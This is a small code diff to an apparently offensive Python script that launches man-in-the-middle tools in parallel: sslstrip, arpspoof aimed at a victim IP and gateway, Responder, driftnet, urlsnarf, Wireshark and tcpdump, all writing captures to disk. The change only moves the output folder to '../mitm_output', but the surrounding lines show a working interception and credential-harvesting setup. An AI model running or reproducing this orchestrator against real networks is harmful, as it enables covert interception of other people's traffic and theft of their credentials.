@@ -17,7 +17,7 @@ async def run_tool(tool_name, command, *args, task):
 
     stdout, stderr = await process.communicate()
     task['finished'] = True
-    output_file = os.path.join('mitm_output', f'{tool_name}.txt')
+    output_file = os.path.join('../mitm_output', f'{tool_name}.txt')
     with open(output_file, 'wb') as file:
         file.write(stdout + b'\n' + stderr)
 
@@ -32,7 +32,7 @@ async def main():
 
     tasks = [
         {'emoji': '🔒', 'name': 'SSL Strip', 'finished': False, 'completed': 0,
-         'command': ('sslstrip', '-i', interface, '-a', '-w', os.path.join('mitm_output', 'sslstrip.pcap'))},
+         'command': ('sslstrip', '-i', interface, '-a', '-w', os.path.join('../mitm_output', 'sslstrip.pcap'))},
         {'emoji': '🎣', 'name': 'ARP Spoof', 'finished': False, 'completed': 0,
          'command': ('arpspoof', '-i', interface, '-t', victim_ip, gateway_ip)},
         {'emoji': '🔑', 'name': 'Responder', 'finished': False, 'completed': 0,
@@ -42,9 +42,9 @@ async def main():
         {'emoji': '🌐', 'name': 'Driftnet', 'finished': False, 'completed': 0, 'command': ('driftnet', '-i', interface)},
         {'emoji': '🔗', 'name': 'Urlsnarf', 'finished': False, 'completed': 0, 'command': ('urlsnarf', '-i', interface)},
         {'emoji': '🕵️', 'name': 'Wireshark', 'finished': False, 'completed': 0,
-         'command': ('wireshark', '-k', '-i', interface, '-w', os.path.join('mitm_output', 'wireshark.pcap'))},
+         'command': ('wireshark', '-k', '-i', interface, '-w', os.path.join('../mitm_output', 'wireshark.pcap'))},
         {'emoji': '📦', 'name': 'Tcpdump', 'finished': False, 'completed': 0,
-         'command': ('tcpdump', '-i', interface, '-w', os.path.join('mitm_output', 'tcpdump.pcap'))},
+         'command': ('tcpdump', '-i', interface, '-w', os.path.join('../mitm_output', 'tcpdump.pcap'))},
     ]
 
     # Create mitm_output folder if it doesn't exist
